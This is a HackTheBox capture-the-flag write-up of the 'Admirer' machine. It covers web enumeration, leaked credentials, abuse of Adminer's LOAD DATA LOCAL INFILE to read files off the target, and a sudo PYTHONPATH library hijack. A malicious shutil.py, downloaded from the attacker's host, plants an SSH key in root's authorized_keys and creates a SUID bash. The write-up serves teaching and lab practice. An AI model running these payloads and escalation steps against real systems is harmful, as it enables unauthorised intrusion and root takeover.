---
title: HTB: Admirer
url: https://0xdf.gitlab.io/2020/09/26/htb-admirer.html
date: 2020-09-26T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-admirer, hackthebox, ctf, nmap, debian, gobuster, robots-text, source-code, adminer, mysql, credentials, sudo, pythonpath, path-hijack, python-library-hijack, htb-nineveh, htb-kryptos, oscp-like-v2
---

![Admirer](https://0xdfimages.gitlab.io/img/admirer-cover.png)

Admirer provided a twist on abusing a web database interface, in that I don’t have creds to connect to any databases on Admirer, but I’ll instead connect to a database on myhost and use queries to get local file access to Admirer. Before getting there, I’ll do some web enumeration to find credentials for FTP which has some outdated source code that leads me to the Adminer web interface. From there, I can read the current source, and get a password which works for SSH access. To privesc, I’ll abuse sudo configured to allow me to pass in a PYTHONPATH, allowing a Python library hijack.

## Box Info

| Name | [Admirer](https://hackthebox.com/machines/admirer)  [Admirer](https://hackthebox.com/machines/admirer) [Play on HackTheBox](https://hackthebox.com/machines/admirer) |
| --- | --- |
| Release Date | [02 May 2020](https://twitter.com/hackthebox_eu/status/1256124184389967872) |
| Retire Date | 26 Sep 2020 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Admirer |
| Radar Graph | Radar chart for Admirer |
| First Blood User | 00:57:47[whois whois](https://app.hackthebox.com/users/35352) |
| First Blood Root | 01:33:13[joohoi joohoi](https://app.hackthebox.com/users/24819) |
| Creators | [polarbearer polarbearer](https://app.hackthebox.com/users/159204)  [GibParadox GibParadox](https://app.hackthebox.com/users/125033) |

## Recon

### nmap

`nmap` found three open TCP ports, FTP (21), SSH (22), and HTTP (80):

```

root@kali# nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 14:29 EDT
Nmap scan report for 10.10.10.187
Host is up (0.015s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.17 seconds

root@kali# nmap -p 21,22,80 -sC -sV -oA scans/nmap-tcpscripts 10.10.10.187
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-04 14:30 EDT
Nmap scan report for 10.10.10.187
Host is up (0.012s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.91 seconds

```

Based on the [OpenSSH](https://packages.debian.org/search?keywords=openssh-server) and [Apache](https://packages.debian.org/search?keywords=apache2) versions, the host is likely running Debian 9 stretch.

The `nmap` scripts also call out a `robots.txt` file with a disallow entry for `/admin-dir`. It did not show anonymous login for the FTP server (I double checked, no access), so I’ll leave FTP and SSH until I find some creds.

### Website - TCP 80

#### Site

The page is an art page, with a lot of images:

![image-20200504143521419](https://0xdfimages.gitlab.io/img/image-20200504143521419.png)

Clicking on any image loads a larger version in the center. In the footer, the link on the left is a dead link (returns 404) to `index.html`. Manually visiting `index.php` loads the same page, so this site runs on PHP.

The ABOUT text is a link that causes a form to pop up:

![image-20200504143706686](https://0xdfimages.gitlab.io/img/image-20200504143706686.png)

Submitting the form is a POST request with `name`, `email`, and `message`. I tried some basic SQLi, but didn’t see anything interesting.

#### robots.txt and /admin-dir

`nmap` identified a `robots.txt` file. It’s got a couple hints:

```

root@kali# curl http://10.10.10.187/robots.txt
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir

```

I’ll note the username, waldo. I’ll also want to check out that directory. However, visiting just returns a 403 forbidden.

![image-20200504144115234](https://0xdfimages.gitlab.io/img/image-20200504144115234.png)

#### Directory Brute Force

I’ll run `gobuster` against the site, and include `-x php` since I know the site is PHP:

```

root@kali# gobuster dir -u http://10.10.10.187 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -t 20 po scans/gobuster-root-medium-php
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     php
[+] Timeout:        10s
===============================================================
2020/05/04 14:39:43 Starting gobuster
===============================================================
/index.php (Status: 200)
/assets (Status: 301)
/images (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/04 14:46:23 Finished
===============================================================

```

I’ll start a second `gobuster` against the directory from `robots.txt`. I ran it once with no extensions, and on finding nothing, I added a handful since it seemed like this is where I’m supposed to find something, as the note said there would be “contacts and creds”. That paid off:

```

root@kali# gobuster dir -u http://10.10.10.187/admin-dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip,html -t 20 -o scans/gobuster-admindir-medium-php_txt_html_zip

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.187/admin-dir
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     zip,html,php,txt
[+] Timeout:        10s
===============================================================
2020/05/04 14:49:13 Starting gobuster
===============================================================
/contacts.txt (Status: 200)
/credentials.txt (Status: 200)
===============================================================
2020/05/04 15:02:11 Finished
===============================================================

```

`gobuster` finds exactly what the `robots.txt` file said would be there, contacts and creds.

#### contacts.txt and credentials.txt

Those two files contain what they say:

```

root@kali# curl http://10.10.10.187/admin-dir/contacts.txt
##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb

##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb

#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb

root@kali# curl http://10.10.10.187/admin-dir/credentials.txt
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!

```

## Shell as Waldo

### FTP With Creds

With creds, I can log into FTP. I used `wget --user ftpuser --password '%n?4Wz}R$tTF7' -m ftp://10.10.10.187` to recursively download all the files (always check what’s there before doing this, or you could flood your host), which in this case were two:

```

root@kali# ls
dump.sql  html.tar.gz

```

`dump.sql` seems to hold the table of images and text shown on the main page.

`html.tar.gz` seems to hold the source for the webpage:

```

root@kali# tar ztf html.tar.gz --exclude "*/*"
assets/
images/
index.php
robots.txt
utility-scripts/
w4ld0s_s3cr3t_d1r/

```

Inside `index.php`, it looks very similar to the source html I get visiting the page, but there’s also connection information for the database:

```

$servername = "localhost";
$username = "waldo";
$password = "]F7jLHw:*G>UPrTo}~A"d6b";
$dbname = "admirerdb";

```

There’s also a new directory in the webroot that `gobuster` hadn’t discovered, `/utility-scripts`:

```

root@kali# ls utility-scripts/
admin_tasks.php  db_admin.php  info.php  phptest.php

```

`admin_tasks.php` is a script that does run commands, but isn’t injectable in any way that I could find. `info.php` is just a PHPInfo page, and `phptest.php` is like a hello world. `db_admin.php` is interesting, despite the fact that it looks plain at first:

```

<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";

  // TODO: Finish implementing this or find a better open source alternative
?>

```

What’s interesting is the comment at the bottom to finish or find an open source alternative. While the other pages in this directory are live on the webserver, this one returns 404.

I have collected two passwords for waldo from the source, `]F7jLHw:*G>UPrTo}~A"d6b` and `Wh3r3_1s_w4ld0?`. Neither work for FTP or SSH as waldo.

### Failures

I spent some time chasing rabbit holes at this point:
- Trying to inject into `admin_tasks.php`.
- Running more `gobusters` to look for other pages.
- Trying to get execution via PHPInfo (like in [Nineveh](/2020/04/22/htb-nineveh.html#shell-as-www-data-via-phpinfophp)).

### Adminer

#### Find Adminer

Thinking about how `db_admin.php` is gone, and knowing the name of the box is Adminer, which is the new name for phpMinAdmin, I checked `/utility-scripts/adminer.php`, and found the login page:

![image-20200504164955919](https://0xdfimages.gitlab.io/img/image-20200504164955919.png)

#### Strategy

The Adminer interface gives me access to whatever DB I wanted to connect to. So the credentials I need are associated with the database I’m logging into. Unfortunately, the creds from the FTP source code don’t work to connect to the database on Admirer.

While I couldn’t get access to any database on Admirer, I could connect to one on my local machine. As [this blog post lays out](https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f), that will still give local file access for whatever the www-data process can read from Admirer, using SQL like:

```

LOAD DATA LOCAL INFILE '/etc/passwd' 
INTO TABLE test.test
FIELDS TERMINATED BY "\n"

```

#### Configure MySQL

Getting my local MySQL server setup so that Adminer could connect to it was a very similar process to what I did in [HTB: Kryptos](/2019/09/21/htb-kryptos.html#auth-bypass). I won’t go into quite as much detail, but it was very useful to use Wireshark to see more detailed messages as to why connections were failing.
- [This post](https://www.techrepublic.com/article/how-to-set-change-and-recover-a-mysql-root-password/) was useful for re-setting my root password on MySQL (would also help with setting it for the first time).
- I remembered from last time I needed to change the bind IP from 127.0.0.1 to 10.10.14.47 in `/etc/mysql/mariadb.conf.d/50-server.cnf`.
- When I saw `Host '10.10.10.187' is not allowed to connect to this MariaDB server` in the Wireshark traffic, [this article](https://confluence.atlassian.com/jirakb/configuring-database-connection-results-in-error-host-xxxxxxx-is-not-allowed-to-connect-to-this-mysql-server-358908249.html) showed how to fix it with:

  ```

  MariaDB [mysql]> GRANT ALL PRIVILEGES ON *.* TO root@10.10.10.187 IDENTIFIED by '0xdf' WITH GRANT OPTION;

  ```
- I created a database, `pwn`, with a table `exfil`:

  ```

  MariaDB [(none)]> CREATE DATABASE pwn;
  Query OK, 1 row affected (0.003 sec)
  MariaDB [(none)]> use pwn
  Database changed
  MariaDB [pwn]> CREATE TABLE exfil (data VARCHAR(256));
  Query OK, 0 rows affected (0.008 sec)

  ```

#### Connect

Now I can log using the creds I set:

![image-20200504210219358](https://0xdfimages.gitlab.io/img/image-20200504210219358.png)

And I’m in:

![image-20200504210323918](https://0xdfimages.gitlab.io/img/image-20200504210323918.png)

#### File Read

I tried to read `/etc/password` and other files in `/etc`, but only got an error:

![image-20200504210730692](https://0xdfimages.gitlab.io/img/image-20200504210730692.png)

But when I asked for `/var/www/html/index.php`, it reads 123 rows:

![image-20200504210823350](https://0xdfimages.gitlab.io/img/image-20200504210823350.png)

I can then enter `SELECT * from pwn.exfil;` into Adminer:

[![](https://0xdfimages.gitlab.io/img/image-20200504211122884.png)](https://0xdfimages.gitlab.io/img/image-20200504211122884.png)

[*Click for full image*](https://0xdfimages.gitlab.io/img/image-20200504211122884.png)

Or I can look at the PCAP in Wireshark and follow the stream when I submitted the `LOAD DATA` command:

[![](https://0xdfimages.gitlab.io/img/image-20200504211151152.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20200504211151152.png)

### SSH as Waldo

#### Identify Password

The reason that I wasn’t able to log into the local database was that the creds on the live site are different from the ones in the FTP backup:

| FTP Backup | Live Site |
| --- | --- |
| `$servername = "localhost";` `$username = "waldo";` `$password = "]F7jLHw:*G>UPrTo}~A"d6b";` `$dbname = "admirerdb";` | `$servername = "localhost"`; `$username = "waldo";` `$password = "&<h5b~yK3F#{PaPB&dA}{H>";` `$dbname = "admirerdb";` |

The creds from the live site will work to log into Adminer:

![image-20200925052845895](https://0xdfimages.gitlab.io/img/image-20200925052845895.png)

#### SSH Access

Those creds not only work for the database, but also for SSH access as waldo:

```

root@kali# sshpass -p '&<h5b~yK3F#{PaPB&dA}{H>' ssh waldo@10.10.10.187
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Tue May  5 01:10:46 2020 from 10.10.14.47
waldo@admirer:~$

```

And for `user.txt`:

```

waldo@admirer:~$ cat user.txt
890e4d73************************

```

## Priv: waldo –> root

### Enumeration

Checking `sudo -l` first pays off:

```

waldo@admirer:~$ sudo -l
[sudo] password for waldo: 
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh

```

Two big take aways:
- I can run this script as root. I’ll need to check into that.
- There’s a tag that I haven’t typically seen on HTB, `SETENV`.

### sudo Syntax Analysis

With no pre-knowledge of `SETENV`, it seems important to figure out what it means and have a good understanding of how `sudo` handles environment variables. Checking the [sudoers man page](https://linux.die.net/man/5/sudoers) against what’s in this configuration, in the flags, there’s `env_reset`, which basically says that, because there’s no `env_keep` setting, none of waldo’s environment will be passed:

> If set, **sudo** will run the command in a minimal environment containing the TERM, PATH, HOME, MAIL, SHELL, LOGNAME, USER, USERNAME and SUDO\_\* variables. Any variables in the caller’s environment that match the env\_keep and env\_check lists are then added, followed by any variables present in the file specified by the *env\_file* option (if any). The default contents of the env\_keep and env\_check lists are displayed when **sudo** is run by root with the **-V** option. If the *secure\_path* option is set, its value will be used for the PATH environment variable. This flag is *on* by default.

Next the `SETENV` tag says that as the caller, I can override `env_reset` using `-E` or by setting variables on the command line when I call `sudo`:

> *SETENV and NOSETENV*
>
> These tags override the value of the *setenv* option on a per-command basis. Note that if SETENV has been set for a command, the user may disable the *env\_reset* option from the command line via the **-E** option. Additionally, environment variables set on the command line are not subject to the restrictions imposed by *env\_check*, *env\_delete*, or *env\_keep*. As such, only trusted users should be allowed to set variables in this manner. If the command matched is **ALL**, the SETENV tag is implied for that command; this default may be overridden by use of the NOSETENV tag.

`secure_path` was also mentioned in the `env_reset` page, and is set here. It prevents the `sudo` caller from setting the `$PATH` variable:

> secure\_path
> Path used for every command run from **sudo**. If you don’t trust the people running **sudo** to have a sane PATH environment variable you may want to use this. Another use is if you want to have the ‘‘root path’’ be separate from the ‘‘user path’’. Users in the group specified by the *exempt\_group* option are not affected by *secure\_path*. This option is not set by default.

One last thing I learned about how `sudo` handles environment variables - I has a list of “bad” variables that don’t carry into the new command even with `-E`, as explained [here](https://stackoverflow.com/questions/35824788/sudo-e-does-not-pass-pythonpath). What that post doesn’t show is that it doesn’t seem to apply to variables passed inline:

```

# $TESTVAR enters through sudo with -E
$ TESTVAR=testValue sudo -E bash -c 'echo $TESTVAR'
testValue

# $PYTHONPATH does not
$ PYTHONPATH=testValue sudo -E bash -c 'echo $PYTHONPATH'

# Passing $PYTHONPATH as part of the command does work
$ sudo PYTHONPATH=testValue bash -c 'echo $PYTHONPATH'
testValue

```

### /opts/scripts/ Analysis

With that background, I’ll look at the script waldo can run as root. In `/opt/scripts`, in addition to `admin_tasks.sh`, there’s a Python script:

```

waldo@admirer:/opt/scripts$ ls 
admin_tasks.sh  backup.py

```

`admin_tasks.sh` is the first place I looked for any kind of injection:

```

#!/bin/bash

view_uptime()
{
    /usr/bin/uptime -p
}

view_users()
{
    /usr/bin/w
}

view_crontab()
{
    /usr/bin/crontab -l
}

backup_passwd()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/passwd to /var/backups/passwd.bak..."
        /bin/cp /etc/passwd /var/backups/passwd.bak
        /bin/chown root:root /var/backups/passwd.bak
        /bin/chmod 600 /var/backups/passwd.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_shadow()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Backing up /etc/shadow to /var/backups/shadow.bak..."
        /bin/cp /etc/shadow /var/backups/shadow.bak
        /bin/chown root:shadow /var/backups/shadow.bak
        /bin/chmod 600 /var/backups/shadow.bak
        echo "Done."
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

backup_db()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running mysqldump in the background, it may take a while..."
        #/usr/bin/mysqldump -u root admirerdb > /srv/ftp/dump.sql &
        /usr/bin/mysqldump -u root admirerdb > /var/backups/dump.sql &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}

# Non-interactive way, to be used by the web interface
if [ $# -eq 1 ]
then
    option=$1
    case $option in
        1) view_uptime ;;
        2) view_users ;;
        3) view_crontab ;;
        4) backup_passwd ;;
        5) backup_shadow ;;
        6) backup_web ;;
        7) backup_db ;;
        *) echo "Unknown option." >&2
    esac

    exit 0
fi

# Interactive way, to be called from the command line
options=("View system uptime"
         "View logged in users"
         "View crontab"
         "Backup passwd file"
         "Backup shadow file"
         "Backup web data"
         "Backup DB"
         "Quit")

echo
echo "[[[ System Administration Menu ]]]"
PS3="Choose an option: "
COLUMNS=11
select opt in "${options[@]}"; do
    case $REPLY in
        1) view_uptime ; break ;;
        2) view_users ; break ;;
        3) view_crontab ; break ;;
        4) backup_passwd ; break ;;
        5) backup_shadow ; break ;;
        6) backup_web ; break ;;
        7) backup_db ; break ;;
        8) echo "Bye!" ; break ;;
        *) echo "Unknown option." >&2
    esac
done

exit 0

```

Unfortunately for me, the only user input that is handled is passed into a switch statement at the end. So if my input is anything other than a single digit between 1 and 8 (or 7 for the non-interactive way), the script will simply echo an error. Even if I could impact the `$PATH`, every binary is called by full path (except `echo`, but that’s built into the shell).

If I then rule out options 1-3 as they simply run commands that don’t interact with something I can modify meaningfully, that leaves the four backup tasks.

Since `backup.py` is custom, I started there:

```

#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)

```

There’s nothing obviously insecure with the script itself.

### Exploit

#### Theory

It turns out there is a path to exploit `backup.py`. As shown above, I can pass a `$PYTHONPATH` into `sudo`. So what is that variable? When a Python script calls `import`, it has a series of paths it checks for the module. I can see this with the `sys` module:

```

waldo@admirer:/opt/scripts$ python3 -c "import sys; print('\n'.join(sys.path))"

/usr/lib/python35.zip
/usr/lib/python3.5
/usr/lib/python3.5/plat-x86_64-linux-gnu
/usr/lib/python3.5/lib-dynload
/usr/local/lib/python3.5/dist-packages
/usr/lib/python3/dist-packages

```

The first empty line is important - it is filled at runtime with the current directory of the script (so if waldo could write to `/opt/scripts`, I could exploit it that way). On this system, `$PYTHONPATH` is current empty:

```

waldo@admirer:/opt/scripts$ echo $PYTHONPATH

```

If I set it and run look at `sys.path` again, my addition is added:

```

waldo@admirer:~$ export PYTHONPATH=/tmp

waldo@admirer:/opt/scripts$ python3 -c "import sys; print('\n'.join(sys.path))"

/tmp
/usr/lib/python35.zip
/usr/lib/python3.5
/usr/lib/python3.5/plat-x86_64-linux-gnu
/usr/lib/python3.5/lib-dynload
/usr/local/lib/python3.5/dist-packages
/usr/lib/python3/dist-packages

```

This means that Python will first try to look in the current script directory, then `/tmp`, then the Python installs to try to load `shutil`.

#### Where

Playing around with this box for a few minutes, it becomes clear that `/tmp` and `/home/waldo` are being cleared of files I create every couple minutes. Those aren’t very OPSEC smart places to be working anyway. I could look at `/dev/shm`, but it’s mounted as `noexec`:

```

waldo@admirer:/opt/scripts$ mount | grep shm
tmpfs on /run/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=1019460k)

```

I can look for writable directories:

```

waldo@admirer:/opt/scripts$ find / -type d -writable 2>/dev/null | grep -v -e '^/proc' -e '/run'
/var/lib/php/sessions
/var/tmp
/tmp
/home/waldo
/home/waldo/.nano

```

`/var/tmp` seems like a good option (`/home/waldo/.nano` would have been good too).

#### What

If this works, root is going to run some Python code for me. My first instinct is to use a reverse shell, but that might actually have issues. If the process errors out or ends, my session could die with it (it actually would work fine in this case). There are tons of options here, but I’ll show two.
- Copy `/bin/bash` and set it owned by root and SUID.
- Write my public SSH key into `/root/.ssh/authorized_keys`.

I’ll write a Python3 script that does both of those on my local box:

```

#!/usr/bin/python3

import os

def make_archive(a,b,c):
    pass

os.system("mkdir -p /root/.ssh; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFFzFsH+WX95lqeCJkOp6cRZufRzw8pGqdoj1q4NL9LmPvtDCiGxsDb5D+vF6rXMrW0cqH3P4kYiTG8+RLrolGFTkR+V/2CXDmABQx5T640fCH77oiMF8U9uoKGS+ow5vA4Vq4QqKFsu+J9qn/sMbLCJ/      874tay6a1ryPJdtjj0SxTems1p2WgklYiZZKKscmYH4+dMtHMdQAKv3CTpWbSE7De4UvAUFvxiKS1yHLh8QF5L0YCUZ42pNtzZ4CHPRojxJZKbOHhTOJms4CLi3CXN/ZEpPijt0mJaGrxnA3oOkOFIscqoeXYFybTs82KzKqwwP4Y6ACWJwk1Dqrv37I/L+9YU/8Rv5b+r0/c1p9lZ1pnnjRt46g/              kocnY3AZxcbmDUHx5wAlsNwK8s5Aw+IOicBYCOIv2KyXUT61/lW2iUTBIiMh0yrqehLfJ7HS3pSycQnWdVPoRbmCfvuJqQGyaJMu+ceqYqpwHEBoUlIjKnSHF30aHKL5ALFREEo1FCc= root@kali' >> /root/.ssh/authorized_keys")
os.system('cp /bin/bash /var/tmp/.0xdf; chown root:root /var/tmp/.0xdf; chmod 4755 /var/tmp/.0xdf')

```

This script uses `os.system` to do each of the things described above. The first calls `mkdir -p` which will create the directory if it doesn’t exist, and happily return and continue if it does. Then it uses `echo` to append my key to `authorized_keys`.

The second simply copies `/bin/bash` to `/var/tmp/.0xdf`, sets the owner as root, and sets the permissions to SUID.

I also included a definition of the `make_archive` function. This will prevent the script from crashing. This is unnecessary in this case where I’m the user running the script. But if I were leaving this for an unsuspecting user to come along and run later, this will prevent errors from being thrown when `backup.py` tries to load the function. If I wanted to go further, I could have this function actually create the archives as expected.

#### Run It

Now I’ll run this exploit with two commands. Upload it to Admirer with `python3 -m http.server 80` on my VM and `wget`:

```

waldo@admirer:/var/tmp$ wget 10.10.14.47/exploit.py -O shutil.py
--2020-05-05 12:14:50--  http://10.10.14.47/exploit.py
Connecting to 10.10.14.47:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 800 [text/plain]
Saving to: ‘shutil.py’

shutil.py                         100%[===========================================================>]     800  --.-KB/s    in 0s      

2020-05-05 12:14:50 (123 MB/s) - ‘shutil.py’ saved [800/800]

```

Run `admin_tasks.sh` calling the web backup option (6):

```

waldo@admirer:/var/tmp$ sudo PYTHONPATH=/var/tmp /opt/scripts/admin_tasks.sh 6
Running backup script in the background, it might take a while...

```

Now I can use either path to root. SSH:

```

root@kali# ssh -i ~/keys/id_rsa_generated root@10.10.10.187
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue May  5 12:14:18 2020 from 10.10.14.47
root@admirer:~#

```

Or SUID `bash`:

```

waldo@admirer:/var/tmp$ ./.0xdf -p
.0xdf-4.4# id
uid=1000(waldo) gid=1000(waldo) euid=0(root) groups=1000(waldo),1001(admins)

```

Either way, grab `root.txt`:

```

root@admirer:~# cat root.txt
996a2609************************

```